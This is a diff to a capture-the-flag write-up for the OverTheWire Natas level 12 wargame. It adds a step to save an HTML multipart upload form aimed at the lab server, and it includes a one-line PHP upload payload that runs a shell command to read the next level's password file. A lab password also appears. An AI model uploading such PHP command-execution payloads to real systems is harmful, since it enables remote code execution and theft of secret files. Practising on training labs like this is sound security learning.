@@ -12,6 +12,7 @@ Password: yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB
 
 - Background:
 - Solution:
+  - Save the following as file `natas12_form.html`: 
   ```html
   <html>
   <form enctype="multipart/form-data" action="http://natas12.natas.labs.overthewire.org/index.php" method="POST">
@@ -23,5 +24,10 @@ Password: yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB
   </form>
   </body>
   </html>
+  ```
+  ```php
+  <?php
+  system("cat /etc/natas_webpass/natas13")
+  ?>
   ```
 - Password: `yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB`
